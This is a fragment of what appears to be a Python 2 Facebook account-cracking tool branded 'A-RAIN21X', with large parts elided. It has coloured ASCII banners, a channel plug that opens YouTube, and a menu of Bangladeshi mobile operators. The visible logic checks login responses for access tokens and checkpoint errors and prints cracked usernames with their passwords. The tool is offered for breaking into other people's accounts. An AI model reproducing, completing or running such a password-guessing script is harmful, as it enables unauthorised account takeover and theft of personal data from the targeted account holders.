...
\033[1;91m        
 ...
 .d8b.         d8888b.  .d8b.  d888888b d8b   db .d888b.  db db    db      
d8' `8b        88  `8D d8' `8b   `88'   888o  88 VP  `8D o88 `8b  d8'      
88ooo88        88oobY' 88ooo88    88    88V8o 88    odD'  88  `8bd8'       
88~~~88 C8888D 88`8b   88~~~88    88    88 V8o88  .88'    88  .dPYb.       
88   88        88 `88. 88   88   .88.   88  V888 j88.     88 .8P  Y8.      
YP   YP        88   YD YP   YP Y888888P VP   V8P 888888D  VP YP    YP      
...
"""
logo2 = """
\x1b[1;92m➣ TOOLS :           👑 A-RAIN21X 👑
\x1b[1;91m➣ FB NAME :  💣 ASHRAFUL RAIN 💣
\x1b[1;93m➣ SUBS CHANNEL:   👬 A-RAIN21X BYPS 👬
\x1b[1;95m➣ GITHUB :  👉 A-RAIN21X / ASHRAFUL RAIN 🔫
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m🥴━━━━━━━━━🙃☹️💘(A-RAIN21X)😒😈😁━━━━━━━━👑\n" 
	print '\033[1;97m[1]\033[1;92m GP [ Best ]'
	print '\033[1;97m[2]\033[1;92m Robi'
	print '\033[1;97m[3]\033[1;92m Airtel'
	print '\033[1;97m[4]\033[1;92m Banglalink [ Good ]'
	print '\033[1;97m[5]\033[1;92m Teletalk'
	print '\033[1;97m[6]\033[1;92m Youtube [ Pls Subscribe ]'
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/@ashrafulrain1061')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[A-RAIN21X-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
